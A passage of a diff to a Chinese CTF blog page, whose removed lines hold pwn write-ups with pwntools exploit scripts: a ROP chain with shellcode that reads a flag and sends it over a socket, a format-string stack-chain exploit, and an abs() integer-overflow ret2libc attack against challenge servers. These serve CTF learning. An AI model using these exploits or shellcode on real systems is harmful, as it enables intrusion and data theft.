class="string">&quot;\x68\x66\x6C\x61\x67\x48\x89\xE7\x6A\x00\x5E\x6A\x02\x58\x0F\x05\x6A\x01\x5F\x48\xC7\xC6\x00\x15\x60\x00\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x00\x5F\x48\xC7\xC6\x00\x15\x60\x00\x6A\x50\x5A\x6A\x01\x58\x0F\x05&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">下面三个指令所对应的机器码</span></span><br><span class="line"><span class="string">rep movs qword ptr [rdi],qword ptr[rsi] ; ret #F348A5C3</span></span><br><span class="line"><span class="string">mov rsi,rsp;ret #4889E6C3</span></span><br><span class="line"><span class="string">pop rbx;pop rbp;pop rcx #5B5D59C3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#将alarm函数的got表换成mprotect的真实地址</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span></span><br><span class="line">payload+=p64(csu_gadget1)</span><br><span class="line">payload+=p64(mprotect_offset-alarm_offset)+p64(alarm_got_addr+<span class="number">0x3d</span>)</span><br><span class="line">payload+=<span class="number">32</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br><span class="line">payload+=p64(csu_gadget1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行mprotect函数</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(alarm_got_addr)</span><br><span class="line">payload+=p64(bss_ye)</span><br><span class="line">payload+=p64(<span class="number">0x100000</span>)+p64(<span class="number">7</span>)</span><br><span class="line">payload+=p64(csu_gadget2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#往bss段+0x10写入pop rbx;pop rbp;pop rcx;ret</span></span><br><span class="line">payload+=<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0xc3595d5b</span>)+p64(bss_addr+<span class="number">0x10</span>+<span class="number">0x3d</span>)</span><br><span class="line">payload+=<span class="number">32</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br><span class="line"></span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#往bss段写入 rep movs qword ptr [rdi],qword ptr[rsi] ; ret</span></span><br><span class="line"><span class="comment">#payload+=p64(bss_addr+0x10)</span></span><br><span class="line">payload+=p64(<span class="number">0xc3a548f3</span>)+p64(bss_addr+<span class="number">0x3d</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#往bss段+0x8写入mov rsi,rsp;ret</span></span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x10</span>)</span><br><span class="line">payload+=p64(<span class="number">0xc3e68948</span>)+p64(bss_addr+<span class="number">0x8</span>+<span class="number">0x3d</span>)+p64(<span class="number">15</span>)</span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行rep指令</span></span><br><span class="line">payload+=p64(pop_rdi_addr)+p64(bss_addr+<span class="number">0x50</span>)</span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x8</span>)</span><br><span class="line">payload+=p64(bss_addr)</span><br><span class="line">payload+=socket+connect+orw</span><br><span class="line">payload+=p64(ret_addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;shellcode_length----------&gt;&#x27;</span>,<span class="built_in">hex</span>(<span class="built_in">len</span>(socket+connect+orw)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;payload_length------------&gt;&#x27;</span>,<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../img/2706180-20220426103751910-1556922758.png"></p>
-<h1 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h1><h2 id="关于socket和connect的参数"><a href="#关于socket和connect的参数" class="headerlink" title="关于socket和connect的参数"></a>关于socket和connect的参数</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">socket</span><span class="params">(<span class="type">int</span> domain, <span class="type">int</span> type, <span class="type">int</span> protocol)</span>;</span><br></pre></td></tr></table></figure>
-
-<p>第一个参数是地址族，也就是IP地址的类型；第二个参数是数据的传输方式；第三个参数是采用的传输协议</p>
-<p>这个没什么好说的，我们最后参数采用的分别是2,1,0 即ipv6，面向连接的套接字，TCP传输协议</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">connect</span><span class="params">(<span class="type">int</span> sockfd, <span class="type">const</span> <span class="keyword">struct</span> sockaddr *addr,<span class="type">socklen_t</span> addrlen)</span>;</span><br></pre></td></tr></table></figure>
-
-<p>第一个参数是socket函数返回的文件描述符；第二个参数是sockaddr结构体的地址；第三个参数是sockaddr的结构体大小</p>
-<p>第一个参数没什么好说的，第二个就很有讲究了，什么是sockaddr结构体？不知道这个怎么写payload？翻一下glibc源码（这个sockaddr结构体位于socket.h这个文件下）</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    __SOCKADDR_COMMON (sa_);        <span class="comment">/* Common data: address family and length.  */</span></span><br><span class="line">    <span class="type">char</span> sa_data[<span class="number">14</span>];                <span class="comment">/* Address data.  */</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>
-
-<p>第一个成员放的是地址族，第二个成员放的是ip地址加端口（这里要把ip地址和端口转换成十六进制以小端序发送（参考如下）</p>
-<p>以转换127.0.0.1 1000为例</p>
-<p>分别把127 0 0 1 1000转换成16进制7F 00 00 01 03e8，然后反序排列为0100007F03e8（<strong>因为p64打包会使ip地址和端口以小端序排列，而最后使用的时候又要使用正序的ip地址和端口，因此我们先将其转换为反序，再用p64打包，最后存储在sockaddr的结构体中的数据依然是正序的ip和端口</strong>）</p>
-<p>第三个结构体就自然而然是16字节了（当时有一个困惑的点就是发送sockaddr结构体的时候，明明只写了8字节，但这个大小（也就是第三个参数）非要填16字节，看完源码答案自然而解）</p>
-<h2 id="关于上文出现问题的解释："><a href="#关于上文出现问题的解释：" class="headerlink" title="关于上文出现问题的解释："></a>关于上文出现问题的解释：</h2><blockquote>
-<p>如果修改了某个函数的got表（至于修改成什么不重要），现在想要使用这个被修改的got表（也就是被修改成的内容）。到最后执行ret指令时，（栈顶的内容）应该用plt地址来衔接，还是用got地址来衔接？</p>
-<p><strong>ret指令，也就是pop rip</strong>，也就是把栈顶的内容（这里要尤其注意，我强调的是<strong>栈顶的内容</strong>）直接弹给rip，如果衔接got地址是什么情况？把一个跳板放到ret里？这个跳板什么都做不了<strong>，跳板，顾名思义，只能被别人踩在下面跳到别人想跳的地址，它自身没有什么意义</strong>。</p>
-<p>如果放入plt地址呢？既然是修改了got表，也就是说肯定是进行延迟绑定了，<strong>执行那个函数plt表的第一条指令，jmp ptr【got地址】，此时去跳到了跳板指向的地方（也就是被修改的got表）</strong>，此时才能完成我们想要的要求。</p>
-</blockquote>
-<h2 id="pwntools中的一个未解之谜"><a href="#pwntools中的一个未解之谜" class="headerlink" title="pwntools中的一个未解之谜"></a>pwntools中的一个未解之谜</h2><p>这里是当时踩的一个坑，至今未能找出原因，在此记录一下。</p>
-<p>上面提到要找到无用函数在libc中的偏移，我最开始采用的是这个方法</p>
-<p><img src="/../img/2706180-20220426103817080-960601662.png"></p>
-<p>但是得到的close函数在libc中的偏移是不正确的，这一点很奇怪。</p>
-<p>这里我记录一下排查这个问题的方法。<strong>先查看一下libc基地址，然后用gdb看一下close延迟绑定之后的真实地址，二者相减看是否是打印出来的close函数在libc中的偏移。显然用这个方法测试之后的偏移是不一样的。此时才意识到上图的方法并不能打印出来正确的close偏移。</strong></p>
-<p><strong>解决方法①：</strong></p>
-<p>gdb动态调试看一下，它的真实地址</p>
-<p><img src="/../img/2706180-20220426103846637-587580728.png"></p>
-<p>然后再用gdb看下，libc的基地址</p>
-<p><img src="/../img/2706180-20220426103859734-1715666525.png"></p>
-<p>二者相减，拿到close在libc中的偏移</p>
-<p><strong>解决方法②：</strong></p>
-<p>使用命令</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">readelf --symbols /lib/x86_64-linux-gnu/libc.so.6 | grep &#x27;mprotect&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../img/2706180-20220426103934059-170044952.png"></p>
-<p>或者</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">objdump -d /lib/x86_64-linux-gnu/libc.so.6 | grep &#x27;_close&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../img/2706180-20220426104003427-537650546.png"></p>
-<p>但是用objdump有时候似乎搜的不太对，反正搜libc中函数偏移的时候，尽量使用readelf命令</p>
-<h2 id="关于打本地时监听端口的一个小坑"><a href="#关于打本地时监听端口的一个小坑" class="headerlink" title="关于打本地时监听端口的一个小坑"></a>关于打本地时监听端口的一个小坑</h2><p>当脚本写完之后，运行的时，我又踩到了最后一个坑。</p>
-<p>这个脚本现在是将flag的数据读到了socket上然后将其发送到connect连接到的端口上，我们想接收这个数据就必须先监听这个端口，然后等待数据发送过来。</p>
-<p><img src="/../img/2706180-20220426102522302-1487885126.png"></p>
-<p>这是我最开始采用的nc -l 1000监听的方式，此时是没有任何数据过来的，最重要的是，connect压根就没有连接到这个端口上(换句话说此时压根都没有监听到这个端口），经过疯狂的调试观察（因为原本是不知道哪的问题，只能从脚本里面一点一点查）依旧没有解决，最后询问学长发现，是监听的参数有问题，下去之后通过查询nc的使用手册发现</p>
-<p><img src="/../img/2706180-20220426102531360-796579110.png"></p>
-<p><strong>参数l开启监听模式，参数p才是指定端口（我的问题就是压根就没指定端口，就直接输入了个1000），参数v是详细打印</strong>（一个v是稍微详细，两个v是显示的更详细，不知道这个详细和更详细是啥意思的话，自己试试就知道了）</p>
-<p>这是正常的情况<br><img src="/../img/2706180-20220426102540992-803595367.png"></p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/posts/d0e6a746.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -666,7 +294,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-10-08 10:24:48" itemprop="dateModified" datetime="2022-10-08T10:24:48+08:00">2022-10-08</time>
+      <time title="修改时间：2023-07-01 19:36:51" itemprop="dateModified" datetime="2023-07-01T19:36:51+08:00">2023-07-01</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -688,90 +316,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h2 id="ez-aarch"><a href="#ez-aarch" class="headerlink" title="ez_aarch"></a>ez_aarch</h2><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>考察的是最简单的arm架构的栈溢出。</p>
-<h3 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略"></a>保护策略</h3><img src="https://s2.loli.net/2022/05/27/wCtDTAO95cxIy61.png" alt="image-20220524111202855" style="zoom:33%;" />
-
-<p>关于arm架构是怎么启动程序和调试的，可以参考一下我的这篇<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16077191.html">博客</a></p>
-<img src="https://s2.loli.net/2022/05/27/hEBHxi1TcwblWUr.png" alt="image-20220524113235409" style="zoom:50%;" />
-
-<p>这里存在溢出，同时题目给了后面，并且很巧合的没开canary，因此这就是最简单的栈溢出题目，不过考虑到这是arm架构的题目跟x86的函数调用还不太一样，没法一眼就看出它的返回地址，需要调试一下。</p>
-<p><img src="https://s2.loli.net/2022/05/27/oMrNmXEPvBVdSeh.png" alt="image-20220524124829771"></p>
-<p>先用cyclic生成48个字符，然后下个断点到0x40000009c8，c过去看一下崩溃的信息。</p>
-<p><img src="https://s2.loli.net/2022/05/27/liJ8YSZTKU7Ep4B.png" alt="image-20220524125046601"></p>
-<p>发现是在kaaalaaa这里崩溃了（因为此时的x30寄存器就是这个值），所以我们只需要把这个地方的内容换成后门函数的地址即可。由于开了PIE，我们无法写入后面函数整个的地址，不过可以只写后门函数的最后一字节，写个0x3c即可。</p>
-<p><img src="https://s2.loli.net/2022/05/27/oUrikO5lxtX34eD.png" alt="image-20220524125339086"></p>
-<h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./stack&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28710</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line">payload=<span class="number">40</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;&lt;&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<img src="https://s2.loli.net/2022/05/27/Nd52ZPUytiEfYrb.png" alt="image-20220524125717811" style="zoom:33%;" />
-
-
-
-<h2 id="dest-love"><a href="#dest-love" class="headerlink" title="dest_love"></a>dest_love</h2><p>总结：</p>
-<p>1、考察的bss段上的格式化字符串漏洞，这道题属于最简单的布置栈链</p>
-<p>2、以后做题之前尽量把libc版本找正确了，这道题的libc试了半天最后试出来了，结果做出来之后发现公告上写了是ubuntu21.04，不然还能做的更快。</p>
-<h3 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h3><img src="https://s2.loli.net/2022/05/27/VxYJs8WM9wqFRQN.png" alt="image-20220524130642814" style="zoom:33%;" />
-
-<h3 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h3><img src="https://s2.loli.net/2022/05/27/J4TjCPa8QM5fgOS.png" alt="image-20220524130844091" style="zoom: 33%;" />
-
-<p>考察的格式化字符串漏洞，同时存在后门函数。</p>
-<p>目前掌握的信息是，格式化字符串漏洞只能用6次，同时format是输入到了bss段，开了PIE。</p>
-<h3 id="大致思路："><a href="#大致思路：" class="headerlink" title="大致思路："></a>大致思路：</h3><p>因为这道题是bss段的格式化字符串，因此需要布置栈链来做，关于栈链的布置可以参考我的这篇<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16167705.html">博客</a></p>
-<p>不过在这之前这道题有一个很恶心的地方，就是需要猜一下libc（其实也不用猜，公告里给了ubuntu21.04的版本）不过我当时做题的时候没有看公告，然后就一个一个试了一下，试的方法就是nc连接到服务器那边的程序，然后输入很多个%p，看一下泄露数据能否和本地的数据类型对应（比如远程栈顶偏移8的位置是个libc中地址，当本地的栈顶偏移8的位置也是个libc地址就算是对应）</p>
-<p>最后试出来是2.33的libc。在ubuntu21.04的docker里跑一下。（如果初步学习怎么使用docker的可以看这篇<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16278170.html">文章</a>)</p>
-<h3 id="调试过程："><a href="#调试过程：" class="headerlink" title="调试过程："></a>调试过程：</h3><p>在布置栈链之前，先去泄露一下我们需要的地址，<strong>对抗PIE需要用程序基地址，布置栈链需要用栈地址</strong>，调试一下，看看栈里的数据。</p>
-<p>下面是执行printf时的栈中情况。</p>
-<p><img src="https://s2.loli.net/2022/05/27/VUkdBPYgJuftAzZ.png" alt="image-20220524190605046"></p>
-<p>由此可以获取所需地址的偏移，分别是4和8（不过需要加上6个寄存器），泄露出来之后，减去对应的偏移，即可获取程序基地址和所需栈地址。</p>
-<p>接下来就是布置栈链。</p>
-<p>先在栈中找一个栈地址（这个栈地址需要再指向一个栈地址），<strong>很明显符合这个条件的是栈顶偏移4的位置</strong>，由于我们的目的是在这个地方写入这个值（见下图）</p>
-<p><img src="https://s2.loli.net/2022/05/27/zUnZm6B8Q1fDTrp.png" alt="image-20220524191227999"></p>
-<p>所以需要把这个dword_4010写到栈里。考虑到程序基地址和偏移8的栈中内容的前四字节一样，因此利用一下偏移8的数据，先将偏移4的内容指向的值去修改为偏移8的栈地址。</p>
-<img src="https://s2.loli.net/2022/05/27/32oN5BtSmJwz6qD.png" alt="image-20220524194519354" style="zoom:33%;" />
-
-<img src="https://s2.loli.net/2022/05/27/gQbT3v5t4nJlsLI.png" alt="image-20220524194437287" style="zoom:33%;" />
-
-<p>此时再通过0x7ffcc75c1504这个地址来修改其指向的值，只需要更改低两字节即可。</p>
-<pre><code>    此时可以看见，我们已经把我们要修改内容的地址给写到栈里了。
-</code></pre>
-<p>接下来，在距离栈顶偏移8这个位置直接写入要修改的数据即可。</p>
-<p>这个属于最简单的布置栈链了，如果熟悉整体流程的话，应该做起来还是比较轻松的。</p>
-<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h3><p>直接复制粘贴这个exp，是打不通的，因为我写了几个函数，放到了tools这个库里面，如果想用下面这个脚本获取shell的话，需要复制粘贴<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">这里的源码</a>新建一个名为tools的py文件。或者把from tools import *以及debug和log函数这些出现的地方给注释掉也行。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./b&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./b&#x27;</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x1210</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What about your love to Dest0g3?&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What about your love to Dest0g3?&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What about your love to Dest0g3?&#x27;</span>,<span class="string">&#x27;%14$p%10$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">base_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x1270</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">stack_leak=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">stack_hook=(stack_leak&amp;<span class="number">0xffff</span>)-<span class="number">0xc8</span></span><br><span class="line"></span><br><span class="line">log(<span class="string">&#x27;base_addr&#x27;</span>,<span class="built_in">hex</span>(base_addr))</span><br><span class="line">log(<span class="string">&#x27;stack_leak&#x27;</span>,<span class="built_in">hex</span>(stack_leak))</span><br><span class="line">dest_addr=base_addr+<span class="number">0x4010</span></span><br><span class="line">log(<span class="string">&#x27;dest_addr&#x27;</span>,<span class="built_in">hex</span>(dest_addr))</span><br><span class="line"></span><br><span class="line">log(<span class="string">&#x27;stack_hook&#x27;</span>,<span class="built_in">hex</span>(stack_hook))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack_hook)+<span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What about your love to Dest0g3?&#x27;</span>,payload)</span><br><span class="line">back_door=(base_addr+<span class="number">0x4010</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(back_door)+<span class="string">&#x27;c%39$hn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What about your love to Dest0g3?&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;%1314520c%14$n&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What about your love to Dest0g3?&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<img src="https://s2.loli.net/2022/05/27/2B3Osle1RNzFM5o.png" alt="image-20220524195121599" style="zoom:33%;" />
-
-<h2 id="ez-pwn"><a href="#ez-pwn" class="headerlink" title="ez_pwn"></a>ez_pwn</h2><h3 id="总结：-1"><a href="#总结：-1" class="headerlink" title="总结："></a>总结：</h3><p>1、通过这道题对原码和补码有了更深的认识，负数的值&#x3D;对应补码-(1&lt;&lt;32) （32位程序）</p>
-<p>2、abs函数是有漏洞的，int类型的范围是-2147483648~ 2147483647 ，这就意味着abs将-2147483648转化为对应的正数是找不到对应的值，就会出现问题。</p>
-<h3 id="保护策略：-1"><a href="#保护策略：-1" class="headerlink" title="保护策略："></a>保护策略：</h3><img src="https://s2.loli.net/2022/05/27/qUpHdgolmKDJTke.png" alt="image-20220524224426473" style="zoom:50%;" />
-
-<h3 id="程序分析：-1"><a href="#程序分析：-1" class="headerlink" title="程序分析："></a>程序分析：</h3><img src="https://s2.loli.net/2022/05/27/NA3umiPhdfqplJF.png" alt="image-20220524225032285" style="zoom:33%;" />
-
-<p>我最开始分析题目的时候，确实没找到漏洞，因为没开canary，我总感觉这道题是能溢出的，然后又一点一点的仔细分析，发现还是没啥毛病，但是根据经验来看，一般感觉没漏洞的时候，漏洞就出现在不太了解的新东西上面。这道题的漏洞点在这个abs函数上，下面来仔细分析一下abs函数漏洞产生的原理。</p>
-<h3 id="abs函数漏洞分析"><a href="#abs函数漏洞分析" class="headerlink" title="abs函数漏洞分析"></a>abs函数漏洞分析</h3><p>abs函数源码</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>        abs</span></span><br><span class="line"><span class="comment">/* Return the absolute value of I.  */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">abs</span> <span class="params">(<span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> i &lt; <span class="number">0</span> ? -i : i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>abs函数的作用就是取绝对值，也就是将负数转换为正数。但是int类型的范围是多少？-2147483648~ 2147483647 这就是int的范围，<strong>可是这个范围不对称，这就意味着使用abs函数，输入-2147483648 它就找不到对应的正值</strong>。当abs函数执行时就会将-2147483648的负号去掉，不过去掉负号之后是2147483648，而int类型的范围里压根就没有这个数字。如果实践一下就会发现-2147483648的绝对值还是-2147483648。</p>
-<h3 id="大致思路：-1"><a href="#大致思路：-1" class="headerlink" title="大致思路："></a>大致思路：</h3><p>因此思路就出来了，输入-2147483648 ，经过abs()函数后，返回的依旧是-2147483648 ，可以绕过<code>if ( (int)abs32(v2) &gt; 10 )</code>和<code>if ( v4 &gt;= v2 )</code>两个检查（为啥能绕过第二个检查？因为v4和v2都是无符号整数，v2存储的值就是0x80000000，所以v4是肯定比v2小，继而绕过检查），从而可以不断的触发<code>__isoc99_scanf(&quot;%d&quot;, &amp;v1[v4++]);</code>这行代码，v4的索引没有限制因此这里就是溢出点，让v4足够大，正好指向栈里v4的值，然后去修改v4的值，让其指向返回地址。接着就可以篡改返回地址了，剩下的就是ret2libc，劫持程序执行流再来一遍，最终获取shell。</p>
-<p>其实这道题调试一下还是比较简单的，我就放几张图片说明一下过程吧。</p>
-<p>下图是正在溢出<br><img src="https://s2.loli.net/2022/05/27/rbFmHDZNL4It7Q5.png" alt="image-20220525224818058" style="zoom:50%;" /></p>
-<p><img src="https://s2.loli.net/2022/05/27/jPh2AinCrUdqYkH.png" alt="image-20220525224936710"></p>
-<p><img src="https://s2.loli.net/2022/05/27/CR3lwfp8qysodVN.png" alt="image-20220525225022664"></p>
-<p>此时的v4这个偏移就让&amp;v1[v4++]指向了返回地址，然后修改返回地址（如下图）</p>
-<p><img src="https://s2.loli.net/2022/05/27/XzZSq78doOAmspi.png" alt="image-20220525225403369"></p>
-<p>接着把返回地址和参数写入，ret2libc即可。</p>
-<h3 id="libc中地址无法直接写入内存中"><a href="#libc中地址无法直接写入内存中" class="headerlink" title="libc中地址无法直接写入内存中"></a>libc中地址无法直接写入内存中</h3><p>后面的过程就不再演示了，最后唯一的一个坑就是写入system地址和&#x2F;bin&#x2F;sh地址时，由于32位程序libc中的地址是0xf7开头，但是这个数据太大了，不能直接用scanf(%d,&amp;a)写入进去。</p>
-<p>剖析一下原理：</p>
-<blockquote>
-<p>由于scanf会对输入的内容进行过滤，只要是正数，那么存到内存里的最大就是0x7fffffff（因为符号位是不能表示大小的），假如现在想存入0xf7123456，我们来倒推一下（先不管它是咋输入进去的，假设它直接存在于内存中），内存中存放的0xf7123456对应二进制就是1111 0111 0001 0010 0011 0100 0101 0110。</p>
-<p>我们来求一下他真正的值，发现符号位是1，因此判断其为负数，然后要减一，接着对整体取反，最后表示为0000 1000 1110 1101 1100 1011 1010 1010 对应16进制为0x8EDCBAA 因为它当成的补码符号位为1，因此它真正的值是-0x8EDCBAA。</p>
-<p>而最终放到返回地址里的值，我们可不管输入的时候是个什么玩意，反正结果是要让他存储时为0xf7123456，因此我们选择输入-0x8EDCBAA即可</p>
-<p>一句话总结就是：输入的负数存储到内存里时，它的补码是可以超过0x7fffffff的限制，从而可以实现写入0xf7这种更大的值。</p>
-</blockquote>
-<p>观察一下0xf7123456和-0x8EDCBAA之间有什么规律没有，很明显如果用0x100000000减去0xf7123456，得到的就是0x8EDCBAA，换个位置让0xf7123456减去0x100000000，自然得到的就是-0x8EDCBAA。</p>
-<p>负值&#x3D;对应补码-0x100000000(32位程序) 这个式子在magic gadget中算偏移为负的时候也出现过。</p>
-<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP:"></a>EXP:</h3><p>PS:直接复制粘贴我这个脚本是打不通的，因为里面出现了我自己定义的函数，如果想使用下面的脚本，需要复制粘贴<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">这里的源码</a>新建一个名为tools的py文件。或者把出现的我自定义的函数注释掉，换回正常的代码。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./ez_pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27271</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./b&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#debug(p,0x0804930D)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;-2147483800&#x27;</span>)</span><br><span class="line">a=<span class="number">4369</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(a+i))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">17</span>))</span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x08049408</span></span><br><span class="line">log(<span class="string">&#x27;puts_plt_addr&#x27;</span>,(puts_plt_addr))</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(puts_plt_addr))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(main_addr))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(puts_got_addr))</span><br><span class="line"></span><br><span 